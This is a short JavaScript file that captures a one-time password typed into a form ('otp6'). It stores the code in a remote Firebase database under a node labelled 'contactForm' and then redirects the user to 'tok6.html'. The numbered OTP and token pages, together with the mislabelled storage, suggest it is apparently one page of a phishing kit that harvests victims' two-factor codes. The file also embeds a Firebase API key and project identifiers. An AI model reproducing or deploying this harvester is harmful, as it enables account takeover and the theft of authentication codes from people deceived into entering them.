

const firebaseConfig = {
    apiKey: "AIzaSyD5wSvrZXq9FFfJ0SoDxGfp6kVQ7VEyNFA",
    authDomain: "start-45a39.firebaseapp.com",
    databaseURL: "https://start-45a39-default-rtdb.firebaseio.com",
    projectId: "start-45a39",
    storageBucket: "start-45a39.appspot.com",
    messagingSenderId: "377019727798",
    appId: "1:377019727798:web:5c56be02bc821e6ec88b17"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var contactFormDB = firebase.database().ref("contactForm");
  
  document.getElementById("otp6").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var userotp = getElementVal("userotp");
  
    saveMessages(userotp);
  
    //   enable alert
    window.location.href = "tok6.html"; // Replace with your actual page URL
}
  
  const saveMessages = (userotp) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      Otp6: userotp,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };